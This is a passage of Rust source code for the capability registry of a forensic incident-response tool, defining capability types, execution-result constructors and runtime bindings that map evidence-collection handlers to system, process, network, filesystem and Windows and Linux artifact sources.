//! JOCKEY Capability Registry
//!
//! Central registry for all forensic capabilities. Each capability has:
//! - Unique ID (string)
//! - Category/domain
//! - Platform support (Windows, Linux, both)
//! - Required privilege level
//! - Description
//! - MITRE ATT&CK technique mappings

#![allow(clippy::too_many_arguments, clippy::type_complexity)]

use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::sync::OnceLock;

use jockey_runtime_evidence::{CollectionStatus, EvidenceCollector, EvidenceOrigin};

/// Unique identifier for a capability
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub struct CapabilityId(pub &'static str);

impl CapabilityId {
    pub const fn new(id: &'static str) -> Self {
        Self(id)
    }

    pub fn as_str(&self) -> &'static str {
        self.0
    }
}

impl std::fmt::Display for CapabilityId {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{}", self.0)
    }
}

/// Platform support for a capability
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum Platform {
    Linux,
    Windows,
    Both,
}

/// Privilege level required to execute this capability
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
pub enum PrivilegeLevel {
    /// Standard user privileges
    User,
    /// Administrator/root privileges
    Admin,
    /// SYSTEM/root with kernel access
    Kernel,
}

/// Category/domain of the capability
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum CapabilityCategory {
    SystemInfo,
    Process,
    User,
    Authentication,
    Service,
    Persistence,
    Network,
    Filesystem,
    WindowsArtifact,
    LinuxArtifact,
    KernelDriver,
    SecurityConfig,
    ApplicationArtifact,
    BackdoorRootkit,
    MaliciousScript,
    FileBinaryMetadata,
    EvidenceIntegrity,
}

/// Status of capability implementation
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "SCREAMING_SNAKE_CASE")]
pub enum ImplementationStatus {
    Implemented,
    Partial,
    RequiresElevation,
    PlatformSpecific,
    Unsupported,
}

impl std::fmt::Display for ImplementationStatus {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Implemented => write!(f, "IMPLEMENTED"),
            Self::Partial => write!(f, "PARTIAL"),
            Self::RequiresElevation => write!(f, "REQUIRES_ELEVATION"),
            Self::PlatformSpecific => write!(f, "PLATFORM_SPECIFIC"),
            Self::Unsupported => write!(f, "UNSUPPORTED"),
        }
    }
}

fn default_implementation_status() -> ImplementationStatus {
    ImplementationStatus::Implemented
}

fn default_capability_version() -> String {
    "0.1.0".to_string()
}

/// A forensic capability definition (serializable version)
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Capability {
    pub id: String,
    pub name: String,
    pub description: String,
    pub category: CapabilityCategory,
    pub platforms: Platform,
    pub privilege: PrivilegeLevel,
    pub mitre_attack_ids: Vec<String>,
    pub collector_function: String,
    pub is_implemented: bool,
    #[serde(default = "default_implementation_status")]
    pub status: ImplementationStatus,
    #[serde(default)]
    pub status_reason: Option<String>,
    #[serde(default = "default_capability_version")]
    pub version: String,
}

impl Capability {
    pub fn new(
        id: &'static str,
        name: &'static str,
        description: &'static str,
        category: CapabilityCategory,
        platforms: Platform,
        privilege: PrivilegeLevel,
        mitre_attack_ids: &'static [&'static str],
        collector_function: &'static str,
        is_implemented: bool,
    ) -> Self {
        let status = if is_implemented {
            ImplementationStatus::Implemented
        } else {
            ImplementationStatus::Unsupported
        };
        Self {
            id: id.to_string(),
            name: name.to_string(),
            description: description.to_string(),
            category,
            platforms,
            privilege,
            mitre_attack_ids: mitre_attack_ids.iter().map(|s| s.to_string()).collect(),
            collector_function: collector_function.to_string(),
            is_implemented,
            status,
            status_reason: None,
            version: "0.1.0".to_string(),
        }
    }

    pub fn with_status(
        mut self,
        status: ImplementationStatus,
        reason: Option<&str>,
    ) -> Self {
        self.status = status;
        self.status_reason = reason.map(|s| s.to_string());
        self.is_implemented = matches!(
            status,
            ImplementationStatus::Implemented
                | ImplementationStatus::Partial
                | ImplementationStatus::RequiresElevation
        );
        self
    }
}

/// An authoritative runtime binding for a capability.
///
/// This is the single source of truth for runtime reachability. The capability registry may
/// declare many capabilities, but only entries present here are genuinely runtime-backed.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct RuntimeCapabilityBinding {
    pub capability_id: &'static str,
    pub runtime_module: &'static str,
    pub runtime_handler: &'static str,
    pub abi_symbol: Option<&'static str>,
    pub platform: Platform,
    pub privilege: PrivilegeLevel,
    pub evidence_contract: &'static str,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum CapabilityTruthStatus {
    DeclaredOnly,
    RuntimeBound,
    PlatformSpecific,
    Unknown,
}

/// Result of a capability execution
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CapabilityExecutionResult {
    pub capability_id: String,
    pub capability_name: String,
    pub handler: String,
    pub runtime_module: String,
    pub platform: String,
    pub privilege: String,
    pub evidence_contract: String,
    pub status: CollectionStatus,
    pub records_count: usize,
    pub error: Option<String>,
    pub warning: Option<String>,
    pub evidence_records: Vec<serde_json::Value>,
    pub execution_time_ms: u64,
}

impl CapabilityExecutionResult {
    pub fn success(
        capability_id: String,
        capability_name: String,
        handler: String,
        runtime_module: String,
        platform: String,
        privilege: String,
        evidence_contract: String,
        records_count: usize,
        evidence_records: Vec<serde_json::Value>,
        execution_time_ms: u64,
    ) -> Self {
        Self {
            capability_id,
            capability_name,
            handler,
            runtime_module,
            platform,
            privilege,
            evidence_contract,
            status: CollectionStatus::Success,
            records_count,
            error: None,
            warning: None,
            evidence_records,
            execution_time_ms,
        }
    }

    pub fn partial(
        capability_id: String,
        capability_name: String,
        handler: String,
        runtime_module: String,
        platform: String,
        privilege: String,
        evidence_contract: String,
        records_count: usize,
        evidence_records: Vec<serde_json::Value>,
        execution_time_ms: u64,
        warning: String,
    ) -> Self {
        Self {
            capability_id,
            capability_name,
            handler,
            runtime_module,
            platform,
            privilege,
            evidence_contract,
            status: CollectionStatus::Partial,
            records_count,
            error: None,
            warning: Some(warning),
            evidence_records,
            execution_time_ms,
        }
    }

    pub fn failed(
        capability_id: String,
        capability_name: String,
        handler: String,
        runtime_module: String,
        platform: String,
        privilege: String,
        evidence_contract: String,
        error: String,
        execution_time_ms: u64,
    ) -> Self {
        Self {
            capability_id,
            capability_name,
            handler,
            runtime_module,
            platform,
            privilege,
            evidence_contract,
            status: CollectionStatus::Failed,
            records_count: 0,
            error: Some(error),
            warning: None,
            evidence_records: Vec::new(),
            execution_time_ms,
        }
    }

    pub fn not_found(
        capability_id: String,
        capability_name: String,
        handler: String,
        runtime_module: String,
        platform: String,
        privilege: String,
        evidence_contract: String,
        execution_time_ms: u64,
    ) -> Self {
        Self {
            capability_id,
            capability_name,
            handler,
            runtime_module,
            platform,
            privilege,
            evidence_contract,
            status: CollectionStatus::NotFound,
            records_count: 0,
            error: Some("Capability source not found".to_string()),
            warning: None,
            evidence_records: Vec::new(),
            execution_time_ms,
        }
    }

    pub fn unsupported(
        capability_id: String,
        capability_name: String,
        handler: String,
        runtime_module: String,
        platform: String,
        privilege: String,
        evidence_contract: String,
        execution_time_ms: u64,
    ) -> Self {
        Self {
            capability_id,
            capability_name,
            handler,
            runtime_module,
            platform,
            privilege,
            evidence_contract,
            status: CollectionStatus::Unsupported,
            records_count: 0,
            error: Some("Capability not supported on this platform".to_string()),
            warning: None,
            evidence_records: Vec::new(),
            execution_time_ms,
        }
    }

    pub fn permission_denied(
        capability_id: String,
        capability_name: String,
        handler: String,
        runtime_module: String,
        platform: String,
        privilege: String,
        evidence_contract: String,
        execution_time_ms: u64,
    ) -> Self {
        Self {
            capability_id,
            capability_name,
            handler,
            runtime_module,
            platform,
            privilege,
            evidence_contract,
            status: CollectionStatus::PermissionDenied,
            records_count: 0,
            error: Some("Insufficient privileges to execute capability".to_string()),
            warning: None,
            evidence_records: Vec::new(),
            execution_time_ms,
        }
    }
}

/// The global capability registry
pub struct CapabilityRegistry {
    pub capabilities: HashMap<String, Capability>,
    by_category: HashMap<CapabilityCategory, Vec<String>>,
    runtime_dispatch: HashMap<String, RuntimeCapabilityBinding>,
}

impl CapabilityRegistry {
    pub fn capabilities(&self) -> impl Iterator<Item = &Capability> {
        self.capabilities.values()
    }
}

impl Default for CapabilityRegistry {
    fn default() -> Self {
        Self::new()
    }
}

impl CapabilityRegistry {
    pub fn new() -> Self {
        let mut registry = Self {
            capabilities: HashMap::new(),
            by_category: HashMap::new(),
            runtime_dispatch: HashMap::new(),
        };
        registry.register_all();
        registry.build_runtime_dispatch_map();
        registry
    }

    fn build_runtime_dispatch_map(&mut self) {
        let bindings = [
            // System Info capabilities
            RuntimeCapabilityBinding {
                capability_id: "system.info.basic",
                runtime_module: "jockey_runtime_system",
                runtime_handler: "collect_system_info",
                abi_symbol: Some("jockey_rt_collect_system"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "system_info",
            },
            RuntimeCapabilityBinding {
                capability_id: "system.info.detailed",
                runtime_module: "jockey_runtime_system",
                runtime_handler: "collect_system_info_detailed",
                abi_symbol: Some("jockey_rt_collect_system"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "system_info_detailed",
            },
            RuntimeCapabilityBinding {
                capability_id: "system.hostname",
                runtime_module: "jockey_runtime_system",
                runtime_handler: "collect_system_info",
                abi_symbol: Some("jockey_rt_collect_system"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "system_info",
            },
            RuntimeCapabilityBinding {
                capability_id: "system.os.name",
                runtime_module: "jockey_runtime_system",
                runtime_handler: "collect_system_info",
                abi_symbol: Some("jockey_rt_collect_system"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "system_info",
            },
            RuntimeCapabilityBinding {
                capability_id: "system.os.version",
                runtime_module: "jockey_runtime_system",
                runtime_handler: "collect_system_info",
                abi_symbol: Some("jockey_rt_collect_system"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "system_info",
            },
            RuntimeCapabilityBinding {
                capability_id: "system.kernel.version",
                runtime_module: "jockey_runtime_system",
                runtime_handler: "collect_system_info",
                abi_symbol: Some("jockey_rt_collect_system"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "system_info",
            },
            RuntimeCapabilityBinding {
                capability_id: "system.architecture",
                runtime_module: "jockey_runtime_system",
                runtime_handler: "collect_system_info",
                abi_symbol: Some("jockey_rt_collect_system"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "system_info",
            },
            RuntimeCapabilityBinding {
                capability_id: "system.cpu.count",
                runtime_module: "jockey_runtime_system",
                runtime_handler: "collect_system_info",
                abi_symbol: Some("jockey_rt_collect_system"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "system_info",
            },
            RuntimeCapabilityBinding {
                capability_id: "system.cpu.model",
                runtime_module: "jockey_runtime_system",
                runtime_handler: "collect_system_info",
                abi_symbol: Some("jockey_rt_collect_system"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "system_info",
            },
            RuntimeCapabilityBinding {
                capability_id: "system.cpu.cores",
                runtime_module: "jockey_runtime_system",
                runtime_handler: "collect_system_info",
                abi_symbol: Some("jockey_rt_collect_system"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "system_info",
            },
            RuntimeCapabilityBinding {
                capability_id: "system.cpu.frequency",
                runtime_module: "jockey_runtime_system",
                runtime_handler: "collect_system_info",
                abi_symbol: Some("jockey_rt_collect_system"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "system_info",
            },
            RuntimeCapabilityBinding {
                capability_id: "system.memory.total",
                runtime_module: "jockey_runtime_system",
                runtime_handler: "collect_system_info",
                abi_symbol: Some("jockey_rt_collect_system"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "system_info",
            },
            RuntimeCapabilityBinding {
                capability_id: "system.memory.boot",
                runtime_module: "jockey_runtime_system",
                runtime_handler: "collect_system_info",
                abi_symbol: Some("jockey_rt_collect_system"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "system_info",
            },
            RuntimeCapabilityBinding {
                capability_id: "system.boot.time",
                runtime_module: "jockey_runtime_system",
                runtime_handler: "collect_system_info",
                abi_symbol: Some("jockey_rt_collect_system"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "system_info",
            },
            RuntimeCapabilityBinding {
                capability_id: "system.uptime",
                runtime_module: "jockey_runtime_system",
                runtime_handler: "collect_system_info",
                abi_symbol: Some("jockey_rt_collect_system"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "system_info",
            },
            RuntimeCapabilityBinding {
                capability_id: "system.timezone",
                runtime_module: "jockey_runtime_system",
                runtime_handler: "collect_system_info",
                abi_symbol: Some("jockey_rt_collect_system"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "system_info",
            },
            RuntimeCapabilityBinding {
                capability_id: "system.locale",
                runtime_module: "jockey_runtime_system",
                runtime_handler: "collect_system_info",
                abi_symbol: Some("jockey_rt_collect_system"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "system_info",
            },
            RuntimeCapabilityBinding {
                capability_id: "system.machine.id",
                runtime_module: "jockey_runtime_system",
                runtime_handler: "collect_system_info",
                abi_symbol: Some("jockey_rt_collect_system"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "system_info",
            },
            RuntimeCapabilityBinding {
                capability_id: "system.virtualization",
                runtime_module: "jockey_runtime_system",
                runtime_handler: "collect_system_info",
                abi_symbol: Some("jockey_rt_collect_system"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "system_info",
            },
            RuntimeCapabilityBinding {
                capability_id: "system.firmware.vendor",
                runtime_module: "jockey_runtime_system",
                runtime_handler: "collect_system_info",
                abi_symbol: Some("jockey_rt_collect_system"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "system_info",
            },
            RuntimeCapabilityBinding {
                capability_id: "system.firmware.version",
                runtime_module: "jockey_runtime_system",
                runtime_handler: "collect_system_info",
                abi_symbol: Some("jockey_rt_collect_system"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "system_info",
            },
            RuntimeCapabilityBinding {
                capability_id: "system.secure.boot",
                runtime_module: "jockey_runtime_system",
                runtime_handler: "collect_system_info",
                abi_symbol: Some("jockey_rt_collect_system"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "system_info",
            },
            RuntimeCapabilityBinding {
                capability_id: "system.disks",
                runtime_module: "jockey_runtime_system",
                runtime_handler: "collect_system_info",
                abi_symbol: Some("jockey_rt_collect_system"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "system_info",
            },
            RuntimeCapabilityBinding {
                capability_id: "system.partitions",
                runtime_module: "jockey_runtime_system",
                runtime_handler: "collect_system_info",
                abi_symbol: Some("jockey_rt_collect_system"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "system_info",
            },
            RuntimeCapabilityBinding {
                capability_id: "system.network.interfaces",
                runtime_module: "jockey_runtime_system",
                runtime_handler: "collect_system_info",
                abi_symbol: Some("jockey_rt_collect_system"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "system_info",
            },
            RuntimeCapabilityBinding {
                capability_id: "system.packages",
                runtime_module: "jockey_runtime_system",
                runtime_handler: "collect_system_info",
                abi_symbol: Some("jockey_rt_collect_system"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "system_info",
            },
            RuntimeCapabilityBinding {
                capability_id: "system.users",
                runtime_module: "jockey_runtime_system",
                runtime_handler: "collect_system_info",
                abi_symbol: Some("jockey_rt_collect_system"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "system_info",
            },
            RuntimeCapabilityBinding {
                capability_id: "system.groups",
                runtime_module: "jockey_runtime_system",
                runtime_handler: "collect_system_info",
                abi_symbol: Some("jockey_rt_collect_system"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "system_info",
            },
            RuntimeCapabilityBinding {
                capability_id: "system.environment",
                runtime_module: "jockey_runtime_system",
                runtime_handler: "collect_system_info",
                abi_symbol: Some("jockey_rt_collect_system"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "system_info",
            },
            RuntimeCapabilityBinding {
                capability_id: "system.paths",
                runtime_module: "jockey_runtime_system",
                runtime_handler: "collect_system_info",
                abi_symbol: Some("jockey_rt_collect_system"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "system_info",
            },
            RuntimeCapabilityBinding {
                capability_id: "system.mounts",
                runtime_module: "jockey_runtime_system",
                runtime_handler: "collect_system_info",
                abi_symbol: Some("jockey_rt_collect_system"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "system_info",
            },
            // Process capabilities
            RuntimeCapabilityBinding {
                capability_id: "process.enumerate",
                runtime_module: "jockey_runtime_process",
                runtime_handler: "enumerate_processes",
                abi_symbol: Some("jockey_rt_collect_processes"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "process_inventory",
            },
            RuntimeCapabilityBinding {
                capability_id: "process.tree",
                runtime_module: "jockey_runtime_process",
                runtime_handler: "collect_process_tree",
                abi_symbol: Some("jockey_rt_collect_processes"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "process_tree",
            },
            RuntimeCapabilityBinding {
                capability_id: "process.modules",
                runtime_module: "jockey_runtime_process",
                runtime_handler: "collect_process_modules",
                abi_symbol: Some("jockey_rt_collect_processes"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "process_modules",
            },
            RuntimeCapabilityBinding {
                capability_id: "process.memory",
                runtime_module: "jockey_runtime_memory",
                runtime_handler: "enumerate_memory_regions",
                abi_symbol: Some("jockey_rt_collect_memory_regions"),
                platform: Platform::Linux,
                privilege: PrivilegeLevel::User,
                evidence_contract: "memory_regions",
            },
            RuntimeCapabilityBinding {
                capability_id: "process.deleted_exe",
                runtime_module: "jockey_runtime_process",
                runtime_handler: "detect_deleted_executables",
                abi_symbol: Some("jockey_rt_collect_processes"),
                platform: Platform::Linux,
                privilege: PrivilegeLevel::User,
                evidence_contract: "deleted_executables",
            },
            RuntimeCapabilityBinding {
                capability_id: "process.handles",
                runtime_module: "jockey_runtime_process",
                runtime_handler: "collect_process_handles",
                abi_symbol: Some("jockey_rt_collect_processes"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::Admin,
                evidence_contract: "process_handles",
            },
            // User capabilities
            RuntimeCapabilityBinding {
                capability_id: "user.enumerate",
                runtime_module: "jockey_runtime_users",
                runtime_handler: "enumerate_users",
                abi_symbol: None,
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "user_inventory",
            },
            // Auth capabilities
            RuntimeCapabilityBinding {
                capability_id: "auth.logon_events",
                runtime_module: "jockey_runtime_auth",
                runtime_handler: "collect_logon_events",
                abi_symbol: None,
                platform: Platform::Both,
                privilege: PrivilegeLevel::Admin,
                evidence_contract: "logon_events",
            },
            RuntimeCapabilityBinding {
                capability_id: "auth.credential_artifacts",
                runtime_module: "jockey_runtime_auth",
                runtime_handler: "collect_credential_artifacts",
                abi_symbol: None,
                platform: Platform::Both,
                privilege: PrivilegeLevel::Admin,
                evidence_contract: "credential_artifacts",
            },
            RuntimeCapabilityBinding {
                capability_id: "auth.policy",
                runtime_module: "jockey_runtime_auth",
                runtime_handler: "collect_auth_policy",
                abi_symbol: None,
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "auth_policy",
            },
            // Service capabilities
            RuntimeCapabilityBinding {
                capability_id: "service.enumerate",
                runtime_module: "jockey_runtime_services",
                runtime_handler: "enumerate_services",
                abi_symbol: None,
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "service_inventory",
            },
            RuntimeCapabilityBinding {
                capability_id: "service.drivers",
                runtime_module: "jockey_runtime_services",
                runtime_handler: "enumerate_drivers",
                abi_symbol: Some("jockey_rt_collect_drivers"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "driver_inventory",
            },
            RuntimeCapabilityBinding {
                capability_id: "service.systemd",
                runtime_module: "jockey_runtime_services",
                runtime_handler: "enumerate_systemd_units",
                abi_symbol: None,
                platform: Platform::Linux,
                privilege: PrivilegeLevel::User,
                evidence_contract: "systemd_units",
            },
            // Network capabilities
            RuntimeCapabilityBinding {
                capability_id: "network.connections",
                runtime_module: "jockey_runtime_network",
                runtime_handler: "enumerate_connections",
                abi_symbol: Some("jockey_rt_collect_network"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "network_connections",
            },
            RuntimeCapabilityBinding {
                capability_id: "network.interfaces",
                runtime_module: "jockey_runtime_network",
                runtime_handler: "enumerate_interfaces",
                abi_symbol: Some("jockey_rt_collect_network"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "network_interfaces",
            },
            RuntimeCapabilityBinding {
                capability_id: "network.routes",
                runtime_module: "jockey_runtime_network",
                runtime_handler: "enumerate_routes",
                abi_symbol: Some("jockey_rt_collect_network"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "network_routes",
            },
            RuntimeCapabilityBinding {
                capability_id: "network.arp",
                runtime_module: "jockey_runtime_network",
                runtime_handler: "enumerate_arp",
                abi_symbol: Some("jockey_rt_collect_network"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "network_arp",
            },
            RuntimeCapabilityBinding {
                capability_id: "network.dns.servers",
                runtime_module: "jockey_runtime_network",
                runtime_handler: "enumerate_dns_servers",
                abi_symbol: Some("jockey_rt_collect_network"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "network_dns_servers",
            },
            RuntimeCapabilityBinding {
                capability_id: "network.dns.cache",
                runtime_module: "jockey_runtime_network",
                runtime_handler: "enumerate_dns_cache",
                abi_symbol: Some("jockey_rt_collect_network"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::Admin,
                evidence_contract: "network_dns_cache",
            },
            RuntimeCapabilityBinding {
                capability_id: "network.hosts",
                runtime_module: "jockey_runtime_network",
                runtime_handler: "enumerate_hosts",
                abi_symbol: Some("jockey_rt_collect_network"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "network_hosts",
            },
            RuntimeCapabilityBinding {
                capability_id: "network.listening.ports",
                runtime_module: "jockey_runtime_network",
                runtime_handler: "enumerate_listening_ports",
                abi_symbol: Some("jockey_rt_collect_network"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "network_listening_ports",
            },
            RuntimeCapabilityBinding {
                capability_id: "network.firewall.policy",
                runtime_module: "jockey_runtime_network",
                runtime_handler: "enumerate_firewall_policy",
                abi_symbol: Some("jockey_rt_collect_network"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::Admin,
                evidence_contract: "network_firewall_policy",
            },
            RuntimeCapabilityBinding {
                capability_id: "network.shares",
                runtime_module: "jockey_runtime_network",
                runtime_handler: "enumerate_shares",
                abi_symbol: Some("jockey_rt_collect_network"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "network_shares",
            },
            RuntimeCapabilityBinding {
                capability_id: "network.listeners",
                runtime_module: "jockey_runtime_network",
                runtime_handler: "enumerate_listeners",
                abi_symbol: Some("jockey_rt_collect_network"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "network_listeners",
            },
            // Filesystem capabilities
            RuntimeCapabilityBinding {
                capability_id: "filesystem.enumerate",
                runtime_module: "jockey_runtime_filesystem",
                runtime_handler: "enumerate_files",
                abi_symbol: Some("jockey_rt_collect_files"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "filesystem_inventory",
            },
            RuntimeCapabilityBinding {
                capability_id: "filesystem.mounts",
                runtime_module: "jockey_runtime_filesystem",
                runtime_handler: "enumerate_mounts",
                abi_symbol: Some("jockey_rt_collect_files"),
                platform: Platform::Both,
                privilege: PrivilegeLevel::User,
                evidence_contract: "filesystem_mounts",
            },
            RuntimeCapabilityBinding {
                capability_id: "filesystem.alternate.data.streams",
                runtime_module: "jockey_runtime_filesystem",
                runtime_handler: "detect_alternate_data_streams",
                abi_symbol: Some("jockey_rt_collect_files"),
                platform: Platform::Windows,
                privilege: PrivilegeLevel::User,
                evidence_contract: "filesystem_ads",
            },
            RuntimeCapabilityBinding {
                capability_id: "filesystem.deleted.open",
                runtime_module: "jockey_runtime_filesystem",
                runtime_handler: "detect_deleted_open_files",
                abi_symbol: Some("jockey_rt_collect_files"),
                platform: Platform::Linux,
                privilege: PrivilegeLevel::User,
                evidence_contract: "filesystem_deleted_open",
            },
            // Windows Artifact capabilities
            RuntimeCapabilityBinding {
                capability_id: "artifact.prefetch",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "carve_prefetch",
                abi_symbol: Some("jockey_rt_collect_artifacts"),
                platform: Platform::Windows,
                privilege: PrivilegeLevel::User,
                evidence_contract: "artifact_prefetch",
            },
            RuntimeCapabilityBinding {
                capability_id: "artifact.lnk",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "carve_lnk_files",
                abi_symbol: Some("jockey_rt_collect_artifacts"),
                platform: Platform::Windows,
                privilege: PrivilegeLevel::User,
                evidence_contract: "artifact_lnk",
            },
            RuntimeCapabilityBinding {
                capability_id: "artifact.recycle.bin",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "carve_recycle_bin",
                abi_symbol: Some("jockey_rt_collect_artifacts"),
                platform: Platform::Windows,
                privilege: PrivilegeLevel::User,
                evidence_contract: "artifact_recycle_bin",
            },
            RuntimeCapabilityBinding {
                capability_id: "artifact.shellbags",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "carve_shellbags",
                abi_symbol: Some("jockey_rt_collect_artifacts"),
                platform: Platform::Windows,
                privilege: PrivilegeLevel::User,
                evidence_contract: "artifact_shellbags",
            },
            RuntimeCapabilityBinding {
                capability_id: "artifact.jumplists",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "carve_jumplists",
                abi_symbol: Some("jockey_rt_collect_artifacts"),
                platform: Platform::Windows,
                privilege: PrivilegeLevel::User,
                evidence_contract: "artifact_jumplists",
            },
            RuntimeCapabilityBinding {
                capability_id: "artifact.amcache",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "carve_amcache",
                abi_symbol: Some("jockey_rt_collect_artifacts"),
                platform: Platform::Windows,
                privilege: PrivilegeLevel::Admin,
                evidence_contract: "artifact_amcache",
            },
            RuntimeCapabilityBinding {
                capability_id: "artifact.srum",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "carve_srum",
                abi_symbol: Some("jockey_rt_collect_artifacts"),
                platform: Platform::Windows,
                privilege: PrivilegeLevel::Admin,
                evidence_contract: "artifact_srum",
            },
            RuntimeCapabilityBinding {
                capability_id: "artifact.etw",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "collect_etw_logs",
                abi_symbol: Some("jockey_rt_collect_artifacts"),
                platform: Platform::Windows,
                privilege: PrivilegeLevel::Admin,
                evidence_contract: "artifact_etw",
            },
            RuntimeCapabilityBinding {
                capability_id: "artifact.event.logs",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "carve_event_logs",
                abi_symbol: Some("jockey_rt_collect_artifacts"),
                platform: Platform::Windows,
                privilege: PrivilegeLevel::Admin,
                evidence_contract: "artifact_event_logs",
            },
            RuntimeCapabilityBinding {
                capability_id: "artifact.recent.files",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "carve_recent_files",
                abi_symbol: Some("jockey_rt_collect_artifacts"),
                platform: Platform::Windows,
                privilege: PrivilegeLevel::User,
                evidence_contract: "artifact_recent_files",
            },
            // Linux Artifact capabilities
            RuntimeCapabilityBinding {
                capability_id: "artifact.shell_history",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "carve_shell_history",
                abi_symbol: Some("jockey_rt_collect_artifacts"),
                platform: Platform::Linux,
                privilege: PrivilegeLevel::User,
                evidence_contract: "artifact_shell_history",
            },
            RuntimeCapabilityBinding {
                capability_id: "artifact.cron",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "carve_cron_entries",
                abi_symbol: Some("jockey_rt_collect_artifacts"),
                platform: Platform::Linux,
                privilege: PrivilegeLevel::User,
                evidence_contract: "artifact_cron",
            },
            RuntimeCapabilityBinding {
                capability_id: "artifact.systemd",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "carve_systemd_units",
                abi_symbol: Some("jockey_rt_collect_artifacts"),
                platform: Platform::Linux,
                privilege: PrivilegeLevel::User,
                evidence_contract: "artifact_systemd",
            },
            RuntimeCapabilityBinding {
                capability_id: "artifact.ssh",
                runtime_module: "jockey_runtime_artifacts",
                runtime_handler: "carve_ssh_config",
                abi_symbol: Some("jockey_rt_collect_artifacts"),
                platform: Platform::Linux,
                privilege: PrivilegeLevel::User,
                evidence_contract: "artifact_ssh",
            },
            RuntimeCapabilityBinding {
